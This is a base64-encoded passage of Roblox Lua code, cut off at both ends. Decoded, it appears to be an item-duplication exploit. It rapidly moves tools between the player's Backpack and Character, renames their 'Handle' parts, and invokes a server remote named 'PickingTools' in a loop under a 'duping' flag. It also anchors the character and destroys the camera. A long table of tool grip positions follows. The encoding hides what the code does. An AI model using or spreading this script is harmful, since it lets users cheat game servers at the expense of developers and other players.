ICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBmaW5kaW4sdG9vbGxlbCBpbiBwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2xsZWw6SXNBKCJUb29sIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sbGVsLk5hbWUgPT0gdG9vbHNlbGN0ZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGxmb3VuMiA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgYmFzYyxhaWpmdyBpbiBwYWlycyh0b29sbGVsOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBhaWpmdy5OYW1lID09ICJIYW5kbGUiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWlqZncuTmFtZSA9ICJIw6IgwqVhw6IgwqVuw6IgwqVkw6IgwqVsw6IgwqVlIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sbGVsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxlbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2xsbGxhaGhoaCA9IHRvb2xsZWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB0b29sbGxsZm91bjIgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBmaWlmaSx0b29sbGxsIGluIHBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sbGxsOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9vbGxsbC5OYW1lID09IHRvb2xzZWxjdGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxsZm91biA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgbmFuYSxqanNqc2ogaW4gcGFpcnModG9vbGxsbDpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgampzanNqLk5hbWUgPT0gIkhhbmRsZSIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGpqc2pzai5OYW1lID0gIkjDoiDCpWHDoiDCpW7DoiDCpWTDoiDCpWzDoiDCpWUiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGwuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGwuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxmZmVsID0gdG9vbGxsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgdG9vbGxsbGZvdW4gPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9vbGxsbGZvdW4gPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbGxsZmZlbCkgPT0gbmlsIHRoZW4gIHRvb2xsbGxmb3VuID0gZmFsc2UgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0IHdhaXQoKSB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvb2xsbGZmZWwpID09IG5pbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRvb2xsbGxmb3VuID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sbGxsZm91bjIgPT0gdHJ1ZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKHRvbGxsbGFoaGhoKSA9PSBuaWwgdGhlbiB0b29sbGxsZm91bjIgPSBmYWxzZSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCB3YWl0KCkgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b2xsbGxhaGhoaCkgPT0gbmlsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxsZm91bjIgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdhaXQoMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgbT0xLCBkdXBlYW1vdCBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UgcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG0gPD0gZHVwZWFtb3QgdGhlbgogICAgICAgICAgICAgICAgZWxzZWlmIG0gPT0gZHVwZWFtb3Qgb3IgbSA+PSBkdXBlYW1vdCAtIDEgdGhlbgogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBhcmdzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbMV0gPSAiUGlja2luZ1Rvb2xzIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgWzJdID0gdG9vbHNlbGN0ZWQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGlja3Rvb2xyZW1vdGU6SW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOldhaXRGb3JDaGlsZCh0b29sc2VsY3RlZCkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UgcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbdG9vbHNlbGN0ZWRdOkZpbmRGaXJzdENoaWxkKCJIYW5kbGUiKS5OYW1lID0gIkjDoiDCpWHDoiDCpW7DoiDCpWTDoiDCpWzDoiDCpWUiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHNlbGN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQodG9vbHNlbGN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdCAgICAgICAgIGlmIGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIik6RmluZEZpcnN0Q2hpbGQoIkNhbWVyYSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkgdW50aWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCh0b29sc2VsY3RlZCkgPT0gbmlsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSA9PSBuaWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBvbGRjZgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB6LHggaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB4Lk5hbWUgPT0gdG9vbHNlbGN0ZWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b29sYW1vdXRoID0gegogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZHVwaW5nID0gZmFsc2UKICAgd2FpdCgxKQoKCmxvY2FsIEdyaXBQb3NUYWJsZSA9IHsKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMSwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNCwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg1LCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMSwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMiwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMywgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNCwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNSwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNiwgMywgMTcpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMSwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMiwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMywgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNCwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNSwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNiwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMSwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMiwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMywgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNCwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNSwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNiwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMSwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMiwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMywgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNCwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNSwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNiwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTEgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0yICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMyAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTQgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC01ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtNiAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTcgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC04ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtOSAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTEwICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTEgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xMiAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTEzICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTQgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNSAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE2ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTcgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOCAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE5ICwgMywgNiksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMjAgLCAzLCA2KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0yMSAsIDMsIDYpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMSAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygzICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNCAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDUgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg2ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNyAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDggLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg5ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTAgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxMSAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEyICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTMgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxNCAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE1ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTYgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygxNyAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDE4ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMTkgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyMCAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIxICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMjIgLCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTYsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTcsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOCwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE5LCAzLCA0MyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMjAsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0yMSwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE2LCAzLCA0MyksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTUsIDMsIDQzKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xNiwgMywgNDMpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTcsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0xOCwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE5LCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMjAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0yMSwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE2LCAzLCA1NSksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMTUsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDIsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDMsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDUsIDMsIDU1KSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDYsIDMsIDU1KSwKICAgICAgICAgVmVjdG9yMy5uZXcoMjMgLCAzLCA1NSksCiAgICAgICAgIFZlY3RvcjMubmV3KDI0ICwgMywgNTUpLAogICAgICAgICAgVmVjdG9yMy5uZXcoMjUgLCAzLCA1NSksCiAgICAgICAgICAgVmVjdG9yMy5uZXcoMjYgLCAzLCA1NSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDI3ICwgMywgNTUpLAogICAgICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTEgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtMiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC0zICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTQgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtNSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC02ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTcgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygtOCAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KC05ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTEwICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTExICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTEyICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTEzICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE0ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE1ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE2ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE3ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE4ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTE5ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTIwICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTIxICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldygyICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoMyAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDQgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg1ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoNiAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDcgLCAzLCAzMCksCiAgICAgICAgICAgICAgICAgICAgICBWZWN0b3IzLm5ldyg4ICwgMywgMzApLAogICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoOSAsIDMsIDMwKSwKICAgICAgICAgICAgICAgICAgICAgIFZlY3RvcjMubmV3KDEwICwgMywgMzA